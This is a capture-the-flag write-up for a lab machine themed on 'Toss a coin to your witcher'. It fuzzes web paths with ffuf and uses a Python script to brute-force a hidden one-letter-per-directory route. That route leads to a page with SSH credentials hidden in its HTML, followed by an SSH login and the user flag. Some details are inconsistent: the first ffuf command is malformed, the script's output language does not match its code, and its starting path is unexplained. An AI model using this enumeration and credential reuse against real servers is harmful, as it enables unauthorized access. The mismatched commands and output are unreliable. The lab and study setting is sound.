# Toss a coin to your witcher

## Techniques used

- Web path enumeration
- Hidden directory/parameter discovery
- SSH credential reuse
- User flag retrieval

## Tools used

- ffuf
- curl
- Python requests
- nmap
- ssh

## Commands and output

### 1. Initial discovery

```bash
$ ffuf -u http://10.10.0.65/t FUZZ -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt
```

The first positive response was on the path:

```text
http://10.10.0.65/t
```

The page content was:

```html
<h1>Toss a coin to your witcher</h1>
<p>Don't fight it, you know you want to sing it, it might even help you out.</p>
<img src="/img/jaskier.jpg" style="height: 40rem;">
```

### 2. Following the route

```bash
$ curl -s http://10.10.0.65/t/o/s/s/
```

```html
<!DOCTYPE html>
<head>
    <title>Toss a coin to your witcher</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <p>"Do you know the lyrics? this one is pretty famous!"</p>
</body>
```

The continuation of the path did not work:

```bash
$ curl -sI http://10.10.0.65/t/o/s/s/a/
```

```text
HTTP/1.1 404 Not Found
Date: Thu, 17 Sep 2026 08:23:08 GMT
Server: Apache/2.4.68 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

### 3. Fuzzing deeper paths

```bash
$ ffuf -u http://10.10.0.65/t/o/s/s/FUZZ/ -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt -mc 200,301,302,403 -fc 404
```

```text
[Status: 200]  _
```

This suggested that a hidden path was built using underscores and letters.

### 4. Automated traversal with Python

```python
import requests

BASE = "http://10.10.0.65"
CHARSET = "abcdefghijklmnopqrstuvwxyz_"

def probe(path):
    r = requests.get(f"{BASE}{path}/", timeout=3)
    if r.status_code == 200:
        return r.text
    return None

path = "/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r"
known_page = probe(path)

while True:
    found = None
    for c in CHARSET:
        candidate = f"{path}/{c}"
        content = probe(candidate)
        if content is not None:
            found = (c, content)
            break
    if not found:
        print("End of path")
        break
    c, content = found
    path += f"/{c}"
    print("Found:", path)
    if content != known_page:
        print(content)
        break
    known_page = content
```

The script eventually reached a different page and exposed a hidden credential:

```text
python3 toss.py
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t
Trouvé : /t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y
```

```html
<!DOCTYPE html>
<head>
    <title>Toss a coin to your witcher</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <p>"So you DO know the lyrics. Well, good for you!"</p>
    <img src="/img/jaskier2.jpg" style="height: 40rem;">
    <p style="display: none;">jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose</p>
</body>
```

This gave the SSH credentials:

- Username: `jaskier`
- Password: `YouHaveTheMostIncredibleNeckItsLikeASexyGoose`

### 5. SSH access and user flag

```bash
$ nmap -Pn -p- --min-rate 2000 -T4 10.10.0.65
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

```bash
$ ssh jaskier@10.10.0.65
Password: YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

```text
Login successful
```

```bash
jaskier@the_continent:~$ ls
```

```text
toss-a-coin.py  user.txt
```

```bash
jaskier@the_continent:~$ cat user.txt
```

```text
EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}
```

## Evidence

- SSH user: `jaskier`
- SSH password: `YouHaveTheMostIncredibleNeckItsLikeASexyGoose`
- Flag: `EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}`

